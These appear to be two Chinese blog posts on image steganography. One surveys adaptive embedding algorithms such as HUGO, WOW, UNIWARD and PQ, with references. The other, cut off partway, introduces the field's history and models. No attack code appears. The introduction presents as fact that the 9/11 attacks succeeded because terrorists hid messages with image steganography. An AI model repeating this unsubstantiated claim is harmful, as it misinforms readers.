基于数字图像自适应隐写算法\n\n数字图像自适应隐写是近十年来众多学者较为关注的一个方向，因为它相较于传统算法具有较强的安全性、鲁棒性。自适应隐写根据载体图像的纹理和待隐藏的信息，根据载体图像的纹理复杂度自适应地调节嵌入的数据量。大部分自适应算法都是基于“嵌入失真+隐写编码”架构实现图像的自适应隐写。目前有多种隐写编码技术，如：湿纸编码[14]、ZZW编码[15],[16],[17]和矩阵编码[18]等，但是目前较为广泛的还是STC编码[19]，其可以通过最小化嵌入失真算法让性能无限接近于最优解，当然也有这些编码的融合方法，如基于湿纸码和STC码的高效隐写算法[20]。自适应隐写算法充分考虑了Stego（载体）的图像纹理特性，通过分析Stego的特点，将秘密信息有选择地嵌入到纹理较为复杂、边缘较为明显的图像区域中。这样做的好处在于：既能保持载体图像外在呈现出来的图像信息，保留视觉上的完整性，又降低了专用隐写分析算法的分析准确率，具有较强的抗分析能力。自适应隐写发展经历了不同的时期，不同的时期有不同的代表算法。\n\n### 0x31 数字图像自适应隐写基本概念\n\n在典型的“嵌入失真+隐写编码”架构中，嵌入失真函数基于最小加性失真的方法，研究者主要研究的有两个方向分别是：失真函数的设计和最小化嵌入失真的实现。如前面所说，自适应隐写的最终目的是让隐秘信息根据载体图像的纹理特征自动调整嵌入信息的强度，使嵌入的秘密信息极力地伪装成载体图像的噪声，让隐写分析攻击者难以分析，防止秘密信息在传输过程中被截获、分析、破坏，提高图像隐写的安全性。为了达到这一目的，就需要从三个维度——“加性失真函数+最小嵌入失真+隐写编码算法”来考虑：加性失真函数能够自适应地在载体图像中根据载体图像的纹理特性寻找最合适的像素点；最小嵌入失真方法能够考量如何想载体图像嵌入秘密信息的过程中使载体图像特性的变化最小化；而隐写编码算法则根据最小失真方法改变的参数来调整嵌入的效率和速率。为了进一步提高隐写编码算法的效率，还出现了多种隐写编码算法的融合方法，如：融合湿纸码和STC码的隐写算法[20]。下面会介绍以上三个维度每种最基础的方法，以便后续理解和分析各种自适应隐写算法。\n\n1. 加性失真函数\n研究表明，载体图像的统计特性的变化与载体图像的纹理特征具有很强的相关性，这种强相关表现在：载体图像的纹理特征越复杂，其嵌入秘密信息后的改变程度越小。而加性失真函数就是评估秘密信息嵌入载体图像后其统计特性改变程度的一种方法，换而言之，失真函数能够反映图像纹理的复杂度，通过失真函数，能够为后期最小嵌入失真提供数据支撑。我们定义两张图片分别为载体图像ℂ和载密图像𝕊，其大小均为 ，载体图像ℂ和载密图像𝕊的像素点取整范围分别为：\n$$\n\\begin{split}\nC_{i,j}\\in0,1,2,\\ldots,253,254,255 \\\\\nS_{i,j}\\in0,1,2,\\ldots,253,254,255 \\\\\n\\end{split}  \n\\tag{1}\n$$\n我们定义$\\beta_{i, j}$为载体图像ℂ在$(i, j)$位置的像素$C_{i, j}$改变为载密图像𝕊位置$(i, j)$的像素$S_{i, j}$产生的失真参数[21]，则载体图像ℂ整体嵌入失真函数$\\Delta(\\mathbb{C}, \\mathbb{S})$为：\n$$\n\\Delta(\\mathbb{C}, \\mathbb{S})=\\sum_{i=1}^{m} \\sum_{j=1}^{n} \\beta_{i j}\\left|C_{i j}-S_{i, j}\\right|, \\quad\\left(0 \\leq \\rho_{i, j} \\leq \\infty\\right)\n\\tag{2}\n$$\n由上述公式可知，嵌入失真函数跟载体图像密切相关。具体来讲，$\\left|C_{i, j}-S_{i, j}\\right|$差值越大，即载体图像改变程度越大，则整体的失真度越高。当然，为了便于理解，这只是一个简单的模型，真正的隐写模型使用到的失真函数比这个更为复杂。\n\n2. 最小嵌入失真\n我们已经通过上述步骤求得嵌入失真函数，接下来就需要考虑怎么把嵌入失真最小化，以最小化嵌入秘密信息带来的对载体信息统计特性的影响，最小化嵌入失真就由此提出。显然，最小化嵌入失真是一个求极值的问题，也就是求最小值的问题，求解这样的问题最有效的方法是求导找斜率，最小嵌入失真函数便基于此思想建立。设$\\pi(\\mathrm{i}, j)$为载体图像ℂ在位置$(i, j)$的像素$C_{i, j}$改变为载密图像𝕊位置$(i, j)$像素$S_{i, j}$的概率，$m$为嵌入的秘密信息的二进制长度。为了求出公式$2$中的最优解（即最小值），我们对其取极值得：\n$$\n\\pi\\left(S_{\\mathrm{i}, \\mathrm{j}}\\right)=\\frac{\\mathrm{e}^{-\\lambda \\rho_{i, j}}}{\\sum_{S \\in \\tau_{\\mathrm{ij}}} \\mathrm{e}^{-\\lambda \\rho_{i, j}}}\n\\tag{3}\n$$\n则秘密信息长度$m$为：\n$$\nm=\\sum_{i=1}^{m} \\sum_{j=1}^{n} \\sum_{S \\in \\tau_{i, j}} \\pi\\left(S_{i, j}\\right) \\log \\frac{1}{\\pi\\left(S_{i, j}\\right)}\n\\tag{4}\n$$\n由公式$4$可得在最小嵌入失真的前提下，可嵌入的秘密信息的长度。这一重要结论在于分离了图像模型$\\pi\\left(S_{\\mathrm{i}, \\mathrm{j}}\\right)$和实际计算中使用到的编码算法，因此，我们可以设计出更好的编码或使用更好的图像模型使最终隐写算法的性能、安全性、抗分析能力最优。需要注意的是，最小化嵌入失真的过程还有一个重要的步骤，就是隐写编码，隐藏信息就是通过隐写编码嵌入到载体图像中。\n\n3. 隐写编码算法\n经过上述步骤，在已知失真函数的情况下，隐写编码算法可以动态调整失真函数，使嵌入秘密信息后载密图像的统计特征无限接近于原始图像（载体图像）。其中，Filler提出的STC（Syndrome-Trellis Codes）是一种二元隐写编码[19]，STC编码奠定了隐写编码算法的研究基础，很多研究者在此基础上改进或融合了STC编码。此外，早期湿纸编码[22]也非常流行。\n\n### 0x32 基于视觉效果的隐写算法\n在早期自适应隐写方向，隐写研究者最开始想到的是在载体图像纹理丰富的区域嵌入隐秘信息，因其纹理复杂，会被观察者误认为是噪点而忽略掉，难以观察出来，具有较强的隐蔽性。基于这个出发点，Kawaguchi E.等人提出了基于位平面的复杂段分割隐写算法（Bit-Plane Complexity Segmentation，BPCS）[23]，该算法提出：将载体图像的位面和待隐藏信息分割成大小相同的位面块，随后将载体图像的低复杂度位面小块与待隐藏的信息替换以隐藏信息。这种算法简单高效，却容易被分析。基于BPCS算法，Da-Chun Wu等人提出了改进的基于像素插值的视觉隐蔽算法PVD（Pixel Value Difference）[24]，该算法将载体图像分割大小相同的互不重叠的像素方块，根据分割出来的像素块之间的差值来确定嵌入的隐秘信息的多少，如果像素块之间的差值越大，说明纹理越复杂，视觉干扰越明显，则可以嵌入越多的隐秘信息。BPCS和PVD算法都是基于视觉效果进行信息隐藏的算法，具有良好的视觉隐蔽性，但是在抗隐写分析算法的性能上却非常低效。学者为了提高自适应算法的抗分析能力，尝试了多种方法，如今主流、有效的方法是基于最小化统计的隐写方法[25],[26],[27]和基于最小加性失真模型的隐写方法[28]。后者在学术界得到了更广泛的发展，并且衍生出大量高质的自适应隐写算法。\n\n### 0x33 空域自适应隐写算法\n为了避免基于视觉效果的信息隐藏算法中的安全性问题，研究者提出了在空间域实现隐写的方法，这些方法大都基于“嵌入失真函数+STC编码技术”架构[29]实现空域隐写，文献[29]首次提出基于该架构的空域自适应隐写算法——（Highly Undetectable setGO）HUGO算法，将自适应隐写算法从基于视觉隐藏算法中的研究方向转移到基于空域图像隐写算法的方向中去，极大地提高了自适应隐写算法地安全性和抗分析能力。在载体图像的灰度共生矩阵提取特征时，HUGO算法将其提取像素地阈值设为T=90，因此载密图像在像素值为[80,93]区间的像素个数发生了明显变化，很容易被统计攻击，极大降低了自适应算法的安全性。为了解决这个问题，Jan Kodovsky等人提出将HUGO算法的阈值设为T=255[30]，即为HUGO255。为了进一步提高类HUGO算法在高嵌入率情况下的安全性，Fridrich在文献[25]中提出MG（Multivariate Gaussian）算法，该算法利用不同分布但相互独立的量化多元高斯模型对载体图像进行建模，通过载体对象（Cover）和载密对象（Stego）最小化KL散度（Kullback Leibler），以生成嵌入失真函数，此外还利用拉格朗日乘子法推导出给定载荷和图像的最优嵌入变化概率。相较于HUGO隐写算法，MG隐写算法对于大于0.3bpp的有效载荷具有更强的安全性；但对于较小的有效载荷，HUGO相对安全一点。文献[31]提出在空间域定义加性隐写失真的WOW方法，该方法在改变一个像素之后，对方向高通滤波器输出的变化加权，随后用Holder范数的倒数聚合，来定义单个像素的成本。\n\nHUGO、MG、WOW隐写算法利用最优搜索保持载密图像与载体图像高阶的统计特性，因此提高了抗统计分析的能力，安全性高于一般的隐写算法。Vojtěch Holub等人为了进一步改进WOW算法，提出了一种测量固定于中的嵌入失真的新方法，该方法独立于嵌入变化（和编码）所在的域，通过Daubechies小波滤波器组获得的方向残差来评估图像元素（如：像素或DCT系数）的改变值。简单来说，就是将嵌入更改限制在那些难以在多个方向建模的区域，同时避免对光滑区域和平滑的边缘进行隐写，由此衍生成（UNIversal WAvelet Relative Distortion，UNIWARD）通用小波相对失真系列的隐写算法。此外，基于空域的自适应隐写算法还有SUNIWARD（Spatial UNIWARD）隐写算法、HILL（HIgh-pass, Low-pass, and Low-pass）隐写算法[32]、MiPOD（Minimizing the Power of Optimal Detector）隐写算法[27]等。这些算法的核心思想是：基于复杂度优先的原则对元素进行更改，简而言之，载体图像区域嵌入的失真小，则被嵌入隐秘信息的概率大，反之，被嵌入隐秘信息的概率小。基于这一思想Li Bin等人提出cost-value分布的思想，结合了扩散原则（Spreading Rule）和聚合原则（Clustering Rule）进一步优化选取图片元素的策略。\n\n值得注意的是，上述算法的嵌入失真都是加性的嵌入失真，而文献[33]提出了一个通过定义联合失真像素块、基于非加性失真隐写的框架。为了降低最小化联合失真函数的复杂度，该文献提出Dejoin（Decomposing Joint distortion）隐写算法[33]，该方法证明了非加性失真嵌入函数在隐写中的可行性。\n\n### 0x34 JPEG域自适应隐写算法\n\nFridrich等人最早在2005年提出一种新的JPEG自适应隐写算法——扰动量化算法[34]。该算法使用量化取整误差的方法来构造嵌入失真函数，该方法使用湿纸编码，在DCT系数取整时，干扰其取整方向以嵌入秘密信息。基于[18]和[34]两种算法，出现了MMe（Modified Matrix Encoding）和PQ（Perturbed Quantization）隐写算法，这两种算法是早期的JPEG自适应隐写算法的代表，其核心架构是“嵌入失真函数+隐写编码算法”。为了进一步改进PQ算法，文献[10]提出了PQe（PQ energy-adaptive）和PQt（PQ texture-adaptive） 隐写算法，这两种算法既融合DCT系数量化取整误差的思想，又考虑了DCT系数各个分块的能量大小和纹理复杂度，明显提升了PQ算法的性能。为了进一步提高JPEG隐写的安全性，Huang F.等人提出NPQ（Normalized PQ）隐写算法[35]，该算法提出了新的信道选择规则，该规则可用于寻找最小的可检测失真的DCT系数。类似于SUNIWARD空域自适应隐写算法，文献[36]提出适用于变换域的JPEG图像隐写算法和Slide Informed UNIWARD（SIUNIWARD）隐写算法。为了让隐写算法可以抗空域和变换域隐写分析的能力，Wang Z.等人提出Hybrid隐写算法，该算法基于DCT系数量化步长和像素块差值，嵌入效率明显高于JUNIWARD隐写算法。此外，还有早期的EBS（Entryopy Block Steganography）隐写算法[37]，能够抵抗高维检测攻击；UED（Uniform Embedding  Distortion）系列算法——UED-SC （UED based on Single Coefficient）、UED-JC（UED based on Joint Coefficients）、SI-UED（Side Informed UED）[38],[39]，基于载体图像DCT系数块内、块间相邻系数生成相应的嵌入失真函数，具有较强的抗检测性优势。\n\n## 0x40 总结\n本章介绍空域隐写算法时，从最简单的LSB隐写原理开始介绍，之后再详细列举了LSB隐写的变种及随即调制、有限调色板隐写等方法；介绍变换域隐写算法时，先从JPEG压缩的原理出发，介绍了其流程，然后解释基于DCT的多种变换域隐写的方法；介绍自适应隐写算法时，则先介绍了自适应隐写算法的基本概念及公式，然后基于这些概念展开阐述各种自适应隐写算法的核心思想。\n\n## 0x50 参考文献\n> [1] Zhang T, Ping X J. Reliable Detection of Spatial LSB Steganography Based on Difference Histogram[J]. Journal of Software, 2004, 15(1):151-158.\n>\n> [2] Fridrich J , Goljan M , Du R . Detecting LSB steganography in color, and gray-scale images[J]. IEEE Multimedia, 2001, 8(4):22-28.\n>\n> [3] Westfeld A, Pfitzmann A. Attacks on Steganographic Systems[C] International Workshop on Information Hiding. Springer-Verlag, 1999.\n>\n> [4] Mielikainen, J. LSB matching revisited[J]. IEEE Signal Processing Letters, 2006, 13(5):285-287.\n>\n> [5] Li X , Yang B , Cheng D , et al. A Generalization of LSB Matching[J]. IEEE Signal Processing Letters, 2009, 16(2):69-72.\n>\n> [6] Fridrich J , Goljan M . Digital image steganography using stochastic modulation[J]. Proceedings of SPIE - The International Society for Optical Engineering, 2003, 5020(4):191--202.\n>\n> [7] Marvel L M , Retter C T , Boncelet C G . Hiding Information in Images.[C]// International Conference on Image Processing. IEEE, 1998.\n>\n> [8] Pennebaker W B , Mitchell J L . JPEG still image data compression standard[M]. Van Nostrand Reinhold, 1992.\n>\n> [9] Westfeld A . F5—A Steganographic Algorithm[M]// Information Hiding. Springer Berlin Heidelberg, 2001.\n>\n> [10] Fridrich J . Statistically undetectable jpeg steganography:dead ends challenges, and opportunities[C]// Workshop on Multimedia & Security. DBLP, 2007.\n>\n> [11] Provos N . Defending Against Statistical Steganalysis[C]// Conference on Usenix Security Symposium. USENIX Association, 2001.\n>\n> [12] Sallee P . Model-Based Steganography[C]// International Workshop on Digital Watermarking. Springer, Berlin, Heidelberg, 2003.[13] Sallee P. MODEL-BASED METHODS FOR STEGANOGRAPHY AND STEGANALYSIS[J]. International Journal of Image and Graphics, 2005, 5(01):23.\n>\n> [14] Fridrich J ,  Goljan M ,  Lisonek P , et al. Writing on wet paper[J]. IEEE Transactions on Signal Processing, 2005, 53(10):3923-3935.\n>\n> [15] Zhang W ,  Wang S ,  Zhang X . Improving Embedding Efficiency of Covering Codes for Applications in Steganography[J]. IEEE Communications Letters, 2007, 11(8):680-682.\n>\n> [16] Zhang W ,  Zhu X . Improving the Embedding Efficiency of Wet Paper Codes by Paper Folding[J]. IEEE Signal Processing Letters, 2009, 16(9):794-797.\n>\n> [17] Zhang W ,  Wang X . Generalization of the ZZW Embedding Construction for Steganography[J]. IEEE Transactions on Information Forensics and Security, 2009, 4(3):564-569.\n>\n> [18] Kim Y , Duric Z , Richards D . Modified Matrix Encoding Technique for Minimal Distortion Steganography[J]. 2006.\n>\n> [19] T Filler ，J Judas ，J Fridrich. Minimizing Additive Distortion in Steganography Using Syndrome-Trellis Codes. IEEE Signal Processing Society, 2011.\n>\n> [20] 刘华, 汤光明. 一种融合湿纸码和STC码的高效隐写算法[J]. 计算机应用研究, 2012, 29(6).\n>\n> [21] Pevný, Tomáš, Filler, Tomáš, Bas P . Using High-Dimensional Image Models to Perform Highly Undetectable Steganography[J]. Lecture Notes in Computer Science, 2010, 6387:161-177.\n>\n> [22] Fridrich J, Goljan, Soukal D. Wet paper codes with improved embedding efficiency[J]. IEEE Transactions on Information Forensics and Security, 2006, 1(1):102-110.\n>\n> [23] Kawaguchi E, Eason R O. Principles and applications of BPCS steganography[C]// Photonics East. International Society for Optics and Photonics, 1999.\n>\n> [24] Wu D C , Tsai W H . A steganographic method for images by pixel-value differencing[J]. Pattern Recognition Letters, 2003, 24(9-10):1613-1626.\n>\n> [25] Fridrich J , Jan Kodovský. MULTIVARIATE GAUSSIAN MODEL FOR DESIGNING ADDITIVE DISTORTION FOR STEGANOGRAPHY[C]// IEEE International Conference on Acoustics. IEEE, 2013.\n>\n> [26] Alattar A M ,  Memon N D ,  Heitzenrater C D , et al. SPIE Proceedings [SPIE IS&T/SPIE Electronic Imaging - San Francisco, California, United States (Sunday 8 February 2015)] Media Watermarking, Security, and Forensics 2015 - Content-adaptive pentary steganography using the multivariate generalized Gaussian cover model[J].  2015, 9409:94090H.\n>\n> [27] Sedighi V ,  Cogranne R ,  Fridrich J . Content-Adaptive Steganography by Minimizing Statistical Detectability[J]. IEEE Transactions on Information Forensics and Security, 2015:1-1.\n>\n> [28] Fridrich J ,  Filler T . Practical methods for minimizing embedding impact in steganography[C]// Electronic Imaging. International Society for Optics and Photonics, 2007.\n>\n> [29] Pevný, Tomáš, Filler, Tomáš, Bas P . Using High-Dimensional Image Models to Perform Highly Undetectable Steganography[J]. Lecture Notes in Computer Science, 2010, 6387:161-177.\n>\n> [30] Kodovsky J , Fridrich J , Holub V . On dangers of overtraining steganography to incomplete cover model[C]// Acm Multimedia & Security Workshop. ACM, 2011.\n>\n> [31] Holub V , Fridrich J J . Designing steganographic distortion using directional filters.[C]// IEEE International Workshop on Information Forensics & Security. IEEE, 2012.\n>\n> [32] Li B , Wang M , Huang J , et al. A new cost function for spatial image steganography[C]// 2014 IEEE International Conference on Image Processing (ICIP). IEEE, 2015.\n>\n> [33] Zhang W , Zhang Z , Zhang L , et al. Decomposing Joint Distortion for Adaptive Steganography[J]. IEEE Transactions on Circuits and Systems for Video Technology, 2016:1-1.\n>\n> [34] Fridrich J , Goljan M , Soukal D . Perturbed quantization steganography[J]. Multimedia Systems, 2005, 11(2):98-107.\n>\n> [35] Huang F , Huang J , Shi Y Q . New Channel Selection Rule for JPEG Steganography[J]. IEEE Transactions on Information Forensics and Security, 2012, 7(4):1181---1191.\n>\n> [36] Holub, Vojtěch, Fridrich J . [ACM Press the first ACM workshop - Montpellier, France (2013.06.17-2013.06.19)] Proceedings of the first ACM workshop on Information hiding and multimedia security - IH&MMSec \\\"13 - Digital image steganography using universal distortion[J]. 2013:59.\n>\n> [37] Wang C , Ni J . An efficient JPEG steganographic scheme based on the block entropy of DCT coefficients[C]// IEEE International Conference on Acoustics. IEEE, 2012.\n>\n> [38] Guo L , Ni J , Shi Y Q . An efficient JPEG steganographic scheme using uniform embedding[C]// Information Forensics and Security (WIFS), 2012 IEEE International Workshop on. IEEE, 2012.\n>\n> [39] Guo L , Ni J , Shi Y Q . Uniform Embedding for Efficient JPEG Steganography[J]. IEEE Transactions on Information Forensics and Security, 2014, 9(5):814-825.\n","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"http://www.killshadow.xyz/tags/MISC/"}]},{"title":"隐写术(一)--简介","date":"2019-05-29T03:05:00.000Z","path":"2019/05/29/隐写术(一)--简介/","raw":"---\ntitle: 隐写术(一)--简介\ndate: 2019-05-29 11:05:00\ncategories:\ntoc: ture\ntags:\n\t- MISC\n\t- CTF\ncomments: true\n---\n\n## 0x00 隐写术背景\n\n> 在信息时代的发展、计算机软硬件的升级、多媒体技术的发展的背景下，信息隐藏愈发朝气蓬勃，已经逐渐成为信息安全研究不可或缺的方向。数千年来，人们一直希望对某些敏感的信息进行保密传送，随即发展出信息加密技术和信息隐藏技术等。在今天这个数字媒体技术和互联网技术爆发的时代，人们这样的需求更加迫切，如何在通信中保证传输秘密信息的隐蔽性已成为研究者、企业、国家关注的课题。<!-- more -->隐写术已经在当今数字世界的多个领域有所利用，例如版权保护、信息追加、防篡改、信息追踪，依托这些领域的成功，隐写术得以蓬勃发展。与加密信息的密码学不同的是，信息隐藏是通过将数据隐藏在多媒体载体中，被称为“隐藏数据中的数据”[1]，它利用人类在感官上（如视觉、听觉）的不敏感性以及媒体载体的信息冗余来隐藏额外的信息，把需要传送的信息嵌入到这些载体中，但却保持原载体信息的相对完整性以达到以假乱真的效果。数字媒体（如视频、音频、图片、网页、文本文件）的多样性保证了信息隐写技术的复杂性与相对安全性，正是因为丰富的数字媒体，信息隐藏技术才可以有丰富的隐藏方式来保证隐藏的信息只能被合法的接受者通过特定的分析技术提取出来。\n\n  信息隐藏的思想在很早的古希腊时代就有所体现。在那时，一位名叫Histaiaeus的古希腊人蓄意煽动反抗波斯国王的一场叛乱。由于需要传递秘密信息，他剃光了他的一个奴隶的头发，并在这个奴隶的头皮上刻下了叛变的信息，当这个奴隶的头发重新长满之后，再把他送出城外，到达另一种城池，由于他的头发已长满能覆盖掉头皮上刻下的信息，他躲过了重重的搜查，最终到达目的地。信息接收者再次剃光了这位奴隶的头，看到了起兵造反的信息。在第二次世界大战期间，德军将信息隐藏在普通照片中，这些照片经过“细微化”处理，也就是将秘密信息写在用肉眼难以察觉的照片中，间谍需要用放大镜读取，间谍通过这技术从敌国将数据传递给友军（如下图）。20世纪80年代，玛格丽特·撒切尔（Margaret Thatcher）为了追查内阁的文件是如何泄露给媒体的，让文本编辑程序处理文本时添加一些空格，以便追踪泄密的内阁成员。同样在中国古代周朝的兵书《六韬》就有《阴符》与《阴书》两篇，大概意思是以一种象征符号形象传递密文给友军；宋朝兵书的《武经总要》里，又对《阴符》略作了改进。\n<div style=\"text-align: center;\">\n![红色圆圈内用德语写了信息](8343187-f28189616cb2ce0f.png)\n</div>\n\t隐写术和数字水印世多媒体安全两个重要的分支。前者主要是对信息进行隐藏以达到“漫天过海”的效果；后者主要是为了保证数字媒体的版权、用途，确保使用者是合法使用数字媒体。随着数字媒体的逐渐增多，数字隐写已逐渐成为隐写术的主流技术，隐写分析作为数字隐写的逆向工程，其研究内容也在随着数字隐写的发展而发展，从上世纪九十年代的隐写变革以来，已有数不胜数的分析方法，而隐写分析的主要目的是将隐写后的载体提取、分析甚至破坏其隐藏的内容。这两种技术犹如蓝军与红军一攻一防相辅相成，共同发展才得以保持平衡关系。但是在这个过程中有相当多的问题：随着人工智能时代的到来，如何提高隐写分析的效率和质量而花费较少的资源和时间成为研究者关注的重心。\n\n随着数字隐写技术的普及与发张，该技术除了被一些企业、政府、军队使用，还被一些地方武装分子、恐怖组织、极端势力利用数字隐写技术传送反动信息，以完成恐怖活动。如：2001年，著名的“911”事件的起因就是恐怖分子通过数字图像隐写技术而逃过美国情报机构的监控，最终被成功利用；2015年，Stegoloader病毒使用数字图片隐写技术入侵了全球的一些计算机系统，这款病毒使用隐写术躲避杀毒软件，成功入侵计算机，据报道其主要攻击目标是美国医疗保障公司。就在今年，即2019年，中国的一家安全企业发现一些图片携带恶意代码的有效负载，以达到攻击特定目标的目的。尽管信息安全攻防领域种，隐写术是一种低频的攻击途径，但一旦被网络犯罪分子、恐怖组织利用，代价是巨大的。因此，研究隐写分析技术在当前这个信息爆炸的时代迫在眉睫，对维护国家安全、社会稳定、企业健康发展具有重要作用。\n\n  从隐写分析算法出现的时间来分类，目前主要有传统的隐写分析算法和基于深度学习的分析算法。对于传统隐写分析方法，则主要以空域和JPEG域为数据隐藏的载体，此外还有一些自适应的隐写及隐写分析方法。目前对于LSBM的检测方法有基于直方图平滑效应的检测方法、基于自然图像邻域相关性的检测方法；针对JPEG域的盲检测算法主要是通过提取DCT系数分布特征和Markov特征来检测；针对盲检测算法，在提取特征这个方向上也有多种方法，思路一般是往高维提取统计特征。虽然目前基于深度学习的分析算法愈来愈热门，但是由于其训练耗时、模型正确性验证复杂且麻烦（很多时候无法通过理论推断模型成熟与否）一直深深困扰研究者。因此，本论文基于传统的隐写分析算法，将多种传统算法提取的特征融合，作为深度学习隐写分析分类器的输入，以提高效率与识别的准确性。\n\n## 0x10 信息隐藏基本原理及研究方法\n\n### 0x11  隐写术基本模型\n\n隐写术是一门隐藏信息的艺术和科学，可以使信息无法被发现。有一个著名的模型阐述了隐写术中各方的角色，这就是经典的Simmons模型——囚徒问题：假设Alice和Bob是监狱中的两个囚犯，他们之间的通信需要通过监狱警官Wendy来传达，同时Wendy能看到他们通信的内容，Alice和Bob要如何通信才能保证他们想要传达的秘密信息不被Wendy所检测察觉出来呢？如下图：\n\n<div style=\"text-align: center;\">\n\n![Simmons模型](8343187-0638d974a140b5b0.png)</div>\n\n我们不妨用更细致的角度来讨论这个问题，如下图：\n<div style=\"text-align: center;\">\n\n![细化的囚徒模型](8343187-0e4e57eadff86216.png)</div>\nAlice需要传送秘密信息m给Bob，但是她只能通过公开的载体对象C（即信纸），而且这个载体对象对第三方而言是完全透明的、可检测的。这时候她需要跟Bob商议好秘密信息嵌入的算法，然后通过嵌入算法把秘密信息m卡嵌入到载体对象C中，最终生成私密对象S，我们可以把它想象成是写满文字的信件，需要通过Wendy这个狱监传递这封信件，但同时Wendy也会检查信件，看有没有什么违法的信息。只要嵌入算法做的足够安全，或者Wendy检查过于粗糙，其中的秘密信息m就不会被他察觉出来。甚至他还可以改动这封信件，使之成为私密对象S’ （被鉴定后的信纸）。最终Bob收到这封信件后，他会用提取算法提取私密对象S’（被鉴定后的信纸）的秘密信息m’，这是Bob就能真正看到Alice真正想对Bob说的信息了。如果Bob能接收到Alice想要表达的信息，则说明越狱成功；否则，如果被监狱长Wendy发现，则越狱失败。\n\n虽然信息隐藏技术的历史悠久，但是近几十年是该技术发展的黄金时期。伴随着计算机技术、多媒体技术的蓬勃发展，信息隐藏技术的发展异彩纷呈。准确来说，信息隐藏学科是一门交叉学科，又有多个分支领域，如图：\n<div style=\"text-align: center;\">\n\n![信息隐藏技术的分支领域](8343187-a14619039e8c39f1.png)</div>\n\n**隐蔽信道（Covert channel）**：在合法信道中被用来传输隐蔽信息的信道称为隐蔽信道，这种隐蔽信道具有非常强的保密性。用Simmonns的囚徒模型解释就是：Alice和Bob通过信纸传输信息，信纸上呈现出来的信息就是合法信道，但是由于Alice和Bob在信纸上通过其他手段把他们想要逃狱的意图隐藏在信息中，通过看不见的“通道”把信息传递给对方，这样的信道就是隐蔽信道。随着互联网的发展，隐蔽信道随着Internet网络协议的变化而发展（如TCP/IP/IPv6等）。按隐藏信息的载体划分，隐蔽信道又可分为两种类型的信道，分别为：存储式隐蔽信道、时间式隐蔽信道。存储式隐蔽信道通过修改网络中的数据包来实现数据隐藏，可应用于TCP/IP的各个层次中；时间式隐蔽信道是通过修改数据包的数据流形式进行数据隐藏，如：修改数据包的顺序、数据包相隔的时间等方式来形成隐蔽信道。按发送对象的意图划分，隐蔽信道分为主动式隐蔽信道、被动式隐蔽信道。发送对象既控制公开信道中信息传输，又控制隐藏信道信息传输，则为主动式隐蔽信道；如果发送对象只负责隐蔽信道的信息传输，将隐蔽信道嵌入到别的公开信道，叫做被动式隐蔽信道。如图：\n<div style=\"text-align: center;\">\n\n![隐蔽信道模型](8343187-8ad7536104d159ad.png)</div>\n**隐写术（Steganograph）**：通过嵌入秘密信息到载体当中的一种技术。隐写信息可以先用传统方法加密，然后再通过特定算法修改载体对象（Cover），加密后的对象叫载密对象（Stego）。其实现原理为：利用载体信息在空间、时间、存储的多余内容（即信息冗余），将秘密信息嵌入到载体生成载密信息，以实现秘密信息的传输。隐写术基本模型：\n<div style=\"text-align: center;\">\n\n![隐写术基本模型](8343187-0e3fc579b6bcf8c1.png)</div>\n**匿名（Anonymity）**：实现匿名通信，就是用现有的技术对通信中的主体进行隐藏保护，通信主体即为发送者和接受者。主要使用匿名重发技术和网络代理技术实现匿名通信[2]。Syverson提出的洋葱路由就是通过路由转发，让中间参与者互不认知对方实现匿名。\n\n  数字水印（Digital watermarking）：在多媒体信息时代，许多数字媒体需要加以保护，以保障创作者的合法权宜，数字水印技术应运而生。这种技术能够将发行的版权信息或其他表明创作者合法权益的信息嵌入到数字媒体当中，以保护数字媒体合法版权。除此之外，数字水印还需保证数字媒体的完整性和可靠性。数字水印有两个较为重要的分类分别叫做脆弱水印与鲁棒水印，这两种水印分别对应数字媒体的两种特性分别叫脆弱性与鲁棒性。其中，脆弱数字水印是指经过分发、传输、使用后，数字水印能够精准判断数字媒体是否被篡改，甚至可以判断数据篡改的位置、程度以恢复原始信息，简单讲就是脆弱性越高数字媒体细微的变化就越容易察觉，主要用来标志数字作品的版权；鲁棒数字水印是指数字媒体没修改、处理之后还能保持相对地完整，并且能被准确识别，即鲁棒性越高数字媒体保持初始状态的稳定性越高，主要用来完整性保护和认证。\n<div style=\"text-align: center;\">\n\n![数字水印信号嵌入模型](8343187-fe6b005b013eed76.png)</div>\n<div style=\"text-align: center;\">\n\n![数字水印信号检测模型](8343187-49f51820ef195755.png)</div>\n\n广义的隐写模型中，有两个重要的步骤，分别是嵌入（Embed）和提取（Extract），对应上两图的嵌入算法和提取算法。\n\n对于**嵌入过程（Imbedded Process）**，利用嵌入算法，甚至使用密码学算法，用密钥进行加密，使秘密信息嵌入进载体当中。对于数字媒体，载体包括：音频、视频、图像、文本等。对于秘密信息，同样包括：音频、视频、图像、文本等。例如，如今黑客常见的攻击方法就是将payload嵌入到图片当中，这一段payload是代码段，这段代码段是恶意的代码，一旦感染计算机系统很容易被提取权限、控制计算机等。秘密信息嵌入到载体之后，会生成一个新的数字媒体对象，我们把它叫做载密对象。为了确保在公开的传输通道传输过程中不被攻击者发现嵌入的秘密信息，载体与载密对象的差别必须非常微小，甚至无法察觉出来。\n\n对于**传输过程（Transfer Process）**，攻击者可以在这个过程中获得嵌入秘密信息后地载密对象。攻击者获得之后，首先检查载密对象对外呈现的（显现的）信息是否有威胁，其次再尝试各种方法、各种算法、工具分析除显现的信息（载体呈现出来的信息）之外的其他信息，即载密信息。一旦被攻击者成功提取或察觉出该载体对象含有秘密信息，则秘密信息的隐写传递失败，否则或送达给秘密信息的接收者。\n\n对于**提取过程（Extraction Processes）**，我们可以把它看成是嵌入过程的逆过程。合法的接收者接收到来自发送者发送的载密对象，利用一定的提取算法（有可能需要解密算法）提取隐藏在载密对象的秘密信息。在这一过程中，如果只需载体信号便可提取出秘密信息，我们称之为非盲提取；如果不需要载体信息即可提取秘密信息，称之为盲提取。\n\n### 0x12 信息隐藏性能评价\n虽然信息隐藏技术涵盖多个学科，分类复杂，但是对其性能的评估有共同的指标，这些指标分别有[2],[3]：\n1. 不可感知性（Imperceptibilit）\n载体被嵌入隐藏信息之后，很难甚至不能被人为感知、预测。不可感知性包括不可见性和不可测性两个维度。不可见性表示载体嵌入信息后，不会造成载体对象的可感知失真，保证原始载体文件与载密文件具有高度相似性；不可测性表示对攻击者来说，难以提取、难以分辨载密文件的隐藏信息，或者说提取、检测的代价无穷大。\n\n2. 